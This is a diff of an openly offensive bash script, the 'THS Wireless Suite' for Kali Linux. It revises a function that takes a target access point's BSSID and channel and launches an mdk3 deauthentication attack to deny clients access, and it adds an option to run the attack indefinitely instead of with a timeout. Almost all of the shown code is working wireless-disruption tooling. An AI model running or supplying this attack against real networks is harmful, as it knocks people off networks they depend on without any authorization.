@@ -2,7 +2,7 @@
 #THS Wireless Suite
 #thsuite.sh v0.1
 #By TAPE
-#Last edit 13-08-2013 17:00 
+#Last edit 13-08-2013 21:00 
 #Written on THS-OS v3 (CR4CK3RB0X) and Kali Linux
 #Tested on both with some options performing better on Kali
 #Source: http://thsuite.googlecode.com/svn/thsuite.sh
@@ -1316,17 +1316,16 @@ f_ap_access_deny() {
 #Setting target AP
 echo -n $GRN">$STD Enter target AP BSSID: $GRN"
 read TARGET_AP
-if [ "$TARGET_AP" == "" ] ; then f_menu ; fi
-while [[ ! "$TARGET_AP" =~ ^[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}$ && ! "$TARGET_AP" =~ ^[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}$ ]]
-do echo $RED">$STD Input error $RED[$STD$TARGET_AP$RED]$STD Incorrect MAC syntax."
+if [ "$TARGET_AP" == "" ] ; then f_wireless_disruption ; fi
+while [[ ! "$TARGET_AP" =~ ^[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}$ && ! "$TARGET_AP" =~ ^[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}$ ]] ; do
+if [ "$TARGET_AP" == "" ] ; then f_wireless_disruption ; fi
+echo $RED">$STD Input error $RED[$STD$TARGET_AP$RED]$STD Incorrect MAC syntax."
 echo -n $GRN">$STD Enter target AP BSSID: $GRN"
 read TARGET_AP
-if [ "$TARGET_AP" == "" ] ; then f_menu ; fi
 done
 	if [[ "$TARGET_AP" =~ ^[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}$ ]] ; then
 	TARGET_AP=$(echo "$TARGET_AP" | sed 's/-/:/g')
 	fi
-echo "$TARGET_AP" > "$THSDIR"blacklist.tmp
 #Setting target channel
 echo -n $GRN">$STD Enter channel of target AP: $GRN"
 read TARGET_CHAN
@@ -1340,19 +1339,23 @@ done
 # Setting attack duration
 echo -n $GRN">$STD Enter attack duration(seconds): $GRN" 
 read ATTACKTIME
-if [ "$ATTACKTIME" == "" ] ; then ATTACKTIME=15 ; fi
 while [ ! `expr $ATTACKTIME + 1 2> /dev/null` ] && [ "$ATTACKTIME" != "" ] ; do
 echo $RED">$STD Input error $RED[$STD$ATTACKTIME$RED]$STD Only numeric values possible."
 echo -n $GRN">$STD Enter attack duration(seconds): $GRN"
-read SCANTIME
-if [ "$ATTACKTIME" == "" ] ; then SCANTIME=15 ; fi
+read ATTACKTIME
 done
 #Creating blacklist file
-echo $GRN">$STD Denying access to $GRN$TARGET_AP$STD.." 
+echo $TARGET_AP > "$THSDIR"blacklist.tmp
+if [ "$ATTACKTIME" == "" ] ; then
+echo $STD"Ctrl-C on xterm window to stop scan"
+xterm -T "THSuite - Deny access to $TARGET_AP" -geometry 105x20-0-0 -e mdk3 $IFACE d -b "$THSDIR"blacklist.tmp -c $TARGET_CHAN
+else
 timeout $ATTACKTIME xterm -T "THSuite - Deny access to $TARGET_AP" -geometry 105x20-0-0 -e mdk3 $IFACE d -b "$THSDIR"blacklist.tmp -c $TARGET_CHAN
+fi
 echo $GRN">$STD Attack stopped" 
+sleep 1.5
 #
-f_exit
+f_menu
 }
 #
 ##
@@ -1499,4 +1502,5 @@ f_menu
 # - Include option to alter save directory
 # - Write general help file / help file for each menu item
 # - Improve checking of monitor mode to allow names other than mon*
+
 
